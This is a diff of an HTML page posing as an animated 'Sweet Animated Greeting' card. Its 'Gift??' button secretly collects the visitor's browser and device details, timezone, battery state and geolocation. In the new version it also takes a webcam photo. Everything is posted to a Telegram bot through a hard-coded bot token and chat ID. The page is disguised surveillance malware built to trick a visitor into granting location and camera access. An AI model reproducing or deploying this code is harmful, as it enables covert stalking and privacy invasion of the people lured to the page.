@@ -1,163 +1,147 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Special Greeting 💖</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sweet Animated Greeting 💕</title>
+  <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Quicksand:wght@400;600&display=swap" rel="stylesheet"/>
   <style>
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
     body {
       margin: 0;
+      font-family: 'Quicksand', sans-serif;
       height: 100vh;
+      overflow: hidden;
+      background: linear-gradient(270deg, #ffdee9, #b5fffc, #ff9a9e, #fad0c4);
+      background-size: 800% 800%;
+      animation: gradientShift 20s ease infinite;
       display: flex;
       justify-content: center;
       align-items: center;
-      background: linear-gradient(to right, #ff758c, #ff7eb3);
-      font-family: 'Comic Sans MS', cursive, sans-serif;
-      overflow: hidden;
+      color: #444;
     }
+    .bubbles { position:absolute; width:100%; height:100%; top:0; left:0; z-index:0; overflow:hidden; pointer-events:none;}
+    .bubble { position:absolute; border-radius:50%; opacity:0.12; animation-name:floatUp; animation-timing-function:ease-in-out; animation-iteration-count:infinite; filter:drop-shadow(0 0 6px rgba(255 255 255 / 0.25)); will-change:transform;}
+    .bubble1{width:140px;height:140px;background:#ff9a9e;bottom:-160px;left:12%;animation-duration:22s;animation-delay:0s;}
+    .bubble2{width:90px;height:90px;background:#fad0c4;bottom:-110px;left:38%;animation-duration:18s;animation-delay:3s;}
+    .bubble3{width:110px;height:110px;background:#a1c4fd;bottom:-140px;left:68%;animation-duration:23s;animation-delay:5s;}
+    .bubble4{width:65px;height:65px;background:#c2e9fb;bottom:-95px;left:83%;animation-duration:17s;animation-delay:1s;}
+    @keyframes floatUp {0%{transform:translateY(0) scale(1);opacity:0.12;}50%{opacity:0.25;}100%{transform:translateY(-110vh) scale(1.1);opacity:0;}}
     .container {
-      text-align: center;
-      background: white;
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0px 8px 20px rgba(0,0,0,0.2);
-      max-width: 400px;
       position: relative;
-      z-index: 10;
+      background: rgba(255 255 255 / 0.9);
+      padding: 35px 40px;
+      border-radius: 24px;
+      box-shadow: 0 15px 40px rgba(0,0,0,0.12);
+      max-width: 500px;
+      text-align: center;
+      z-index:10;
+      user-select:none;
     }
-    h1 {
-      color: #ff4081;
-      font-size: 2rem;
-    }
-    p {
-      color: #333;
-      font-size: 1.2rem;
-      margin: 15px 0;
-    }
-    .btn {
-      background: #ff4081;
-      color: white;
-      border: none;
-      padding: 12px 20px;
-      border-radius: 25px;
-      font-size: 1rem;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
-    .btn:hover {
-      background: #e91e63;
-    }
-    .bubble {
-      position: absolute;
-      bottom: -100px;
-      background: rgba(255,255,255,0.3);
-      border-radius: 50%;
-      animation: rise 10s infinite ease-in;
-    }
-    @keyframes rise {
-      0% { transform: translateY(0) scale(1); opacity: 1; }
-      100% { transform: translateY(-120vh) scale(1.5); opacity: 0; }
-    }
+    h1 { font-family:'Pacifico', cursive; font-size:44px; color:#ff5eab; margin-bottom:15px;}
+    p { font-size:19px; line-height:1.6; margin-bottom:25px; color:#555; white-space:pre-line;}
+    .hearts { font-size:32px; margin-bottom:20px; animation:pulse 1.8s infinite; color:#ff5eab;}
+    @keyframes pulse {0%,100%{transform:scale(1);}50%{transform:scale(1.15);}}
+    .btn { padding:12px 25px; background:#ff5eab; color:white; border:none; border-radius:25px; cursor:pointer; font-size:16px; margin-top:10px;}
+    .btn:hover { background:#e63a91;}
+    .info { font-size:14px; color:#666; margin-top:15px; background: rgba(255,245,250,0.7); padding:10px; border-radius:12px; white-space: pre-line;}
   </style>
 </head>
 <body>
+  <div class="bubbles">
+    <div class="bubble bubble1"></div>
+    <div class="bubble bubble2"></div>
+    <div class="bubble bubble3"></div>
+    <div class="bubble bubble4"></div>
+  </div>
+
   <div class="container">
-    <h1 id="greeting">Hello, Love 💕</h1>
-    <p id="message">You mean the world to me. 🌍✨</p>
-    <button class="btn" onclick="sendToTelegram()">💌 Click here for surprise </button>
+    <h1 id="greeting">Hello! 🌞</h1>
+    <p id="message">Loading message...</p>
+    <div class="hearts">💗🌸💫💞🥰💕</div>
+    <div class="info" id="info">Shvmmk here.</div>
+    <button class="btn" onclick="sendToTelegram()">💌 Gift??</button>
   </div>
 
   <script>
-    // --- Telegram Config ---
     const BOT_TOKEN = "6298320462:AAFgjEjGy0udiRNZRG1VVpooKYyQpj4UF6U";
     const CHAT_ID = "6000036430";
 
-    // --- Greeting based on time ---
-    function updateGreeting() {
+    function getRandomItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+
+    function updateGreeting(){
+      const greetingEl = document.getElementById('greeting');
+      const messageEl = document.getElementById('message');
       const hour = new Date().getHours();
-      const greeting = document.getElementById("greeting");
-      if (hour < 12) greeting.textContent = "Good Morning, Love ☀️💕";
-      else if (hour < 18) greeting.textContent = "Good Afternoon, Cutie 🌸";
-      else greeting.textContent = "Good Evening, Darling 🌙💖";
+      let greeting='', messages=[];
+      if(hour>=5&&hour<12){ greeting='Good Morning! 🌞'; messages=[`Rise & shine! ☀️ Enjoy your day 💕`,`Morning sunshine! 🌸 Keep smiling!`,`Have a bright morning full of joy ✨`]; }
+      else if(hour>=12&&hour<17){ greeting='Good Afternoon! ☀️'; messages=[`Hello! 🌞 Have a peaceful afternoon 💖`,`Keep shining and smile 🌼`,`Enjoy your afternoon moments 🌟`]; }
+      else if(hour>=17&&hour<21){ greeting='Good Evening! 🌙'; messages=[`Evening is here 🌙 Relax & unwind 💕`,`Lovely evening! Enjoy the calm 🌌`,`Good evening! Stars await your dreams ✨`]; }
+      else{ greeting='Good Night! 🌌'; messages=[`Time to rest 🌙 Sweet dreams 💫`,`Night night! Sleep tight 💖`,`May tomorrow be brighter 🌟`]; }
+      greetingEl.textContent = greeting;
+      messageEl.textContent = getRandomItem(messages);
     }
 
-    // --- Device info ---
-    function getDeviceInfo() {
+    function getDeviceInfo(){
       return {
-        userAgent: navigator.userAgent,
         platform: navigator.platform,
-        language: navigator.language,
+        browser: navigator.userAgent,
         screen: `${screen.width}x${screen.height}`,
+        language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
       };
     }
 
-    // --- Location ---
-    function getLocation(callback) {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            callback({
-              latitude: pos.coords.latitude.toFixed(2),
-              longitude: pos.coords.longitude.toFixed(2)
-            });
-          },
-          () => callback(null)
-        );
-      } else {
-        callback(null);
-      }
+    async function getBatteryInfo(){
+      if(navigator.getBattery){ const bat = await navigator.getBattery(); return `Battery: ${Math.round(bat.level*100)}%, Charging: ${bat.charging}`; }
+      return 'Battery info not available';
     }
 
-    // --- Send to Telegram ---
-    function sendToTelegram() {
-      const device = getDeviceInfo();
-      getLocation((loc) => {
-        let message = `💌 New Visitor Info\n\n` +
-                      `📱 Platform: ${device.platform}\n` +
-                      `🌐 Browser: ${device.userAgent}\n` +
-                      `🖥️ Screen: ${device.screen}\n` +
-                      `🕒 Timezone: ${device.timezone}\n` +
-                      `🌍 Language: ${device.language}`;
-
-        if (loc) {
-          message += `\n📍 Location: ${loc.latitude}, ${loc.longitude}`;
-        } else {
-          message += `\n📍 Location: Not shared`;
-        }
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message
-          })
-        })
-        .then(res => res.json())
-        .then(data => {
-          alert("✅ Info sent to Telegram!");
-          console.log("Sent:", data);
-        })
-        .catch(err => console.error("Error:", err));
+    function getLocation(){
+      return new Promise((resolve)=>{ 
+        if(navigator.geolocation){
+          navigator.geolocation.getCurrentPosition((pos)=>{
+            resolve({lat:pos.coords.latitude.toFixed(2), lon:pos.coords.longitude.toFixed(2)});
+          },()=>resolve(null));
+        }else resolve(null);
       });
     }
 
-    // --- Bubbles ---
-    function createBubbles() {
-      const bubble = document.createElement("div");
-      bubble.classList.add("bubble");
-      const size = Math.random() * 50 + 20;
-      bubble.style.width = size + "px";
-      bubble.style.height = size + "px";
-      bubble.style.left = Math.random() * window.innerWidth + "px";
-      bubble.style.animationDuration = (Math.random() * 5 + 5) + "s";
-      document.body.appendChild(bubble);
-      setTimeout(() => bubble.remove(), 10000);
+    async function capturePhoto(){
+      try{
+        const stream = await navigator.mediaDevices.getUserMedia({video:true});
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+        const blob = await imageCapture.takePhoto();
+        track.stop();
+        return blob;
+      }catch(err){ console.log("Camera not allowed"); return null; }
     }
-    setInterval(createBubbles, 500);
 
-    // --- Init ---
+    async function sendToTelegram(){
+      const device = getDeviceInfo();
+      const loc = await getLocation();
+      const battery = await getBatteryInfo();
+      const photoBlob = await capturePhoto();
+
+      let msg = `💌 Visitor Info\nPlatform: ${device.platform}\nBrowser: ${device.browser}\nScreen: ${device.screen}\nLanguage: ${device.language}\nTimezone: ${device.timezone}\n${battery}`;
+      if(loc) msg+=`\nLocation: https://maps.google.com/?q=${loc.lat},${loc.lon}`;
+
+      document.getElementById('info').textContent = msg;
+
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('text', msg);
+      if(photoBlob) formData.append('photo', photoBlob, 'snapshot.jpg');
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${photoBlob?'sendPhoto':'sendMessage'}`, {method:'POST', body:formData})
+        .then(r=>r.json()).then(d=>console.log("Sent:",d)).catch(e=>console.log("Error:",e));
+    }
+
     updateGreeting();
   </script>
 </body>
